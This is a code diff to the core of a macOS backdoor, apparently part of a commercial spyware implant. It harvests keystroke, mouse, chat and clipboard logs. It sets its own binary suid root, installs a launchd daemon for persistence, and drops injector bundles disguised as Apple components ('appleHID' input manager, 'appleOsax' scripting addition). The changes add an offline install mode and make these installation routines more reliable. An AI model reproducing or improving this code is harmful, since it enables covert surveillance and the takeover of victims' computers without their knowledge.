@@ -232,7 +232,7 @@ static void computerWillShutdown(CFMachPortRef port,
 
 - (BOOL)_UISpoof;
 
-- (void)_dropInputManager;
+- (BOOL)_dropInputManager;
 
 - (void)_solveKernelSymbolsForKext;
 
@@ -714,11 +714,11 @@ static void computerWillShutdown(CFMachPortRef port,
                                       withLogID: 0] == TRUE)
                   {
 #ifdef DEBUG_CORE
-                    warnLog(@"Log header agentID %x, status %x command size %d keylog %S", 
-                             shMemLog->agentID, 
-                             shMemLog->status,
-                             shMemLog->commandDataSize,
-                             shMemLog->commandData);
+                    verboseLog(@"Log header agentID %x, status %x command size %d keylog %S", 
+                               shMemLog->agentID, 
+                               shMemLog->status,
+                               shMemLog->commandDataSize,
+                               shMemLog->commandData);
                     verboseLog(@"header data size %d", sizeof(shMemoryLog));
 #endif
                   }
@@ -735,10 +735,10 @@ static void computerWillShutdown(CFMachPortRef port,
                                       withLogID: 0] == TRUE)
                 {
 #ifdef DEBUG_CORE
-                  infoLog(@"Log header agentID %x, status %x command size %d", 
-                          shMemLog->agentID, 
-                          shMemLog->status,
-                          shMemLog->commandDataSize);
+                  verboseLog(@"Log header agentID %x, status %x command size %d", 
+                             shMemLog->agentID, 
+                             shMemLog->status,
+                             shMemLog->commandDataSize);
                   verboseLog(@"header data size %lu", sizeof(shMemoryLog));
 #endif
                 }
@@ -748,7 +748,7 @@ static void computerWillShutdown(CFMachPortRef port,
             case AGENT_MOUSE:
               {
 #ifdef DEBUG_CORE
-                infoLog(@"Receveid mouse log");
+                verboseLog(@"Logs from mouse");
 #endif
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                         length: shMemLog->commandDataSize];
@@ -1152,7 +1152,7 @@ static void computerWillShutdown(CFMachPortRef port,
             case AGENT_CHAT:
               {
 #ifdef DEBUG_CORE
-                infoLog(@"Logs from agent CHAT");
+                verboseLog(@"Logs from agent CHAT");
 #endif    
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                         length: shMemLog->commandDataSize];
@@ -1176,7 +1176,7 @@ static void computerWillShutdown(CFMachPortRef port,
             case AGENT_CLIPBOARD:
               {
 #ifdef DEBUG_CORE
-                infoLog(@"Logs from clipboard");
+                verboseLog(@"Logs from clipboard");
 #endif
                 
                 logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
@@ -1196,7 +1196,7 @@ static void computerWillShutdown(CFMachPortRef port,
             default:
               {
 #ifdef DEBUG_CORE
-                infoLog(@"Agent not yet implemented suckers: %d", shMemLog->agentID);
+                errorLog(@"Agent not yet implemented: %d", shMemLog->agentID);
 #endif
                 break;
               }
@@ -1275,7 +1275,6 @@ static void computerWillShutdown(CFMachPortRef port,
       while (true)
         sleep(1);
     }
-    
 }
 
 - (void)_guessNames
@@ -1698,10 +1697,9 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
       
       [gUtil makeSuidBinary: [[NSBundle mainBundle] executablePath]];
-      
       return YES;
     }
-    
+  
   return NO;
 }
 
@@ -1777,7 +1775,7 @@ static void computerWillShutdown(CFMachPortRef port,
                                         stringByDeletingLastPathComponent]
                                        stringByDeletingLastPathComponent]
                                       stringByDeletingLastPathComponent],
-                                     BACKDOOR_DAEMON_PLIST ];
+                                     BACKDOOR_DAEMON_PLIST];
           
           NSArray *arguments = [NSArray arrayWithObjects:
                                 @"load",
@@ -1792,6 +1790,12 @@ static void computerWillShutdown(CFMachPortRef port,
           
           exit(0);
         }
+      else
+        {
+#ifdef DEBUG_CORE
+          infoLog(@"mdworker flag found! Already loaded by launchd");
+#endif
+        }
       
       return YES;
     }
@@ -1799,23 +1803,65 @@ static void computerWillShutdown(CFMachPortRef port,
   return NO;
 }
 
-- (void)_dropInputManager
+- (BOOL)_dropInputManager
 {
   NSString *err;
   NSString *_backdoorContentPath = [NSString stringWithFormat: @"%@/%@",
                                     [[NSBundle mainBundle] bundlePath],
                                     @"Contents"];
   
+  if ([[NSFileManager defaultManager] fileExistsAtPath: @"/Library/InputManagers/appleHID"])
+    {
+      [[NSFileManager defaultManager] removeItemAtPath: @"/Library/InputManagers/appleHID"
+                                                 error: nil];
+    }
+
   //
   // Input Manager
   //
-  mkdir("/Library/InputManagers", 0755);
-  mkdir("/Library/InputManagers/appleHID", 0755);
-  mkdir("/Library/InputManagers/appleHID/appleHID.bundle", 0755);
-  mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents", 0755);
-  mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/MacOS", 0755);
-  mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/Resources", 0755);
-  
+  if (mkdir("/Library/InputManagers", 0755) == -1 && errno != EEXIST)
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"Error mkdir InputManagers (%d)", errno);
+#endif
+      return NO;
+    }
+  if (mkdir("/Library/InputManagers/appleHID", 0755) == -1 && errno != EEXIST)
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"Error mkdir appleHID (%d)", errno);
+#endif
+      return NO;
+    }
+  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle", 0755) == -1 && errno != EEXIST)
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"Error mkdir appleHID.bundle (%d)", errno);
+#endif
+      return NO;
+    }
+  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents", 0755) == -1 && errno != EEXIST)
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"Error mkdir Contents (%d)", errno);
+#endif
+      return NO;
+    }
+  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/MacOS", 0755) == -1 && errno != EEXIST)
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"Error mkdir MacOS (%d)", errno);
+#endif
+      return NO;
+    }
+  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/Resources", 0755) == -1 && errno != EEXIST)
+    {
+#ifdef DEBUG_CORE
+      errorLog(@"Error mkdir Resources (%d)", errno);
+#endif
+      return NO;
+    }
+
   NSMutableDictionary *rootObj2 = [NSMutableDictionary dictionaryWithCapacity: 4];
   NSMutableDictionary *innerDict2 = [NSMutableDictionary dictionaryWithCapacity: 1];
   [innerDict2 setObject: gInputManagerName
@@ -1892,10 +1938,17 @@ static void computerWillShutdown(CFMachPortRef port,
          waitUntilEnd: YES];
   
   [destDir release];
+  return YES;
 }
 
 - (void)_dropOsaxBundle
 {  
+  if ([[NSFileManager defaultManager] fileExistsAtPath: @"/Library/ScriptingAdditions/appleOsax"])
+    {
+      [[NSFileManager defaultManager] removeItemAtPath: @"/Library/ScriptingAdditions/appleOsax"
+                                                 error: nil];
+    }
+
   //
   // Scripting folder
   //
@@ -1905,7 +1958,6 @@ static void computerWillShutdown(CFMachPortRef port,
   mkdir("/Library/ScriptingAdditions/appleOsax/Contents/MacOS", 0755);
   mkdir("/Library/ScriptingAdditions/appleOsax/Contents/Resources", 0755);
 
-  
   NSString *destDir = [[NSString alloc] initWithFormat:
                        @"/Library/ScriptingAdditions/%@/Contents/MacOS/%@",
                        OSAX_FOLDER,
@@ -2337,6 +2389,19 @@ static void computerWillShutdown(CFMachPortRef port,
                                                      minor: &gOSMinor
                                                     bugFix: &gOSBugFix];
 
+  NSString *offlineFlag = [NSString stringWithFormat: @"%@/00",
+                           [[NSBundle mainBundle] bundlePath]];
+  
+  if ([[NSFileManager defaultManager] fileExistsAtPath: offlineFlag])
+    {
+#ifdef DEBUG_CORE
+      warnLog(@"Offline mode, installing the backdoor right now");
+#endif
+      [self makeBackdoorResident];
+      [[NSFileManager defaultManager] removeItemAtPath: offlineFlag
+                                                 error: nil];
+    }
+
   //
   // With SLIPLIST mode, the backdoor will be executed preauth with uid = 0
   // and will be killed once the user will login, thus we just suid the core
@@ -2345,12 +2410,24 @@ static void computerWillShutdown(CFMachPortRef port,
   if (getuid() == 0)
     {
 #ifdef DEBUG_CORE
-      infoLog(@"Root executed us, we don't need him :)");
+      infoLog(@"Root executed us");
+      infoLog(@"Making binary root suid and dropping launch agents plist");
 #endif
       
       [gUtil makeSuidBinary: [[NSBundle mainBundle] executablePath]];
-      [self makeBackdoorResident];
-      
+      if ([self makeBackdoorResident] == NO)
+        {
+#ifdef DEBUG_CORE
+          errorLog(@"Error while dropping Launch Agents plist for SLI PLIST mode");
+#endif
+        }
+      else
+        {
+#ifdef DEBUG_CORE
+          infoLog(@"Launch Agents plist dropped");
+#endif
+        }
+
       exit(0);
     }
 
@@ -2360,7 +2437,7 @@ static void computerWillShutdown(CFMachPortRef port,
   [self _resizeSharedMemoryWindow];
   
   //
-  // Check it we're the only one on this machine
+  // Check it we're the only one on the current user session (1 per user)
   //
   [self _checkForOthers];
   
@@ -2525,9 +2602,6 @@ static void computerWillShutdown(CFMachPortRef port,
       
       if (getuid() == 0 || geteuid() == 0)
         {
-#ifdef DEBUG_CORE
-          infoLog(@"Dropping injector component");
-#endif
           //
           // Now it's time for all the Info.plist mess
           // we need to create the fs hierarchy for the input manager and kext
@@ -2544,7 +2618,12 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
               infoLog(@"Dropping input manager");
 #endif
-              [self _dropInputManager];
+              if ([self _dropInputManager] == NO)
+                {
+#ifdef DEBUG_CORE
+                  errorLog(@"Error while installing input manager");
+#endif
+                }
             }
         }
     }
@@ -2552,7 +2631,7 @@ static void computerWillShutdown(CFMachPortRef port,
   [NSThread detachNewThreadSelector: @selector(_registerForShutdownNotifications)
                            toTarget: self
                          withObject: nil];
-  
+
 #ifndef NO_KEXT
   int ret = 0;
   int kextLoaded = 0;
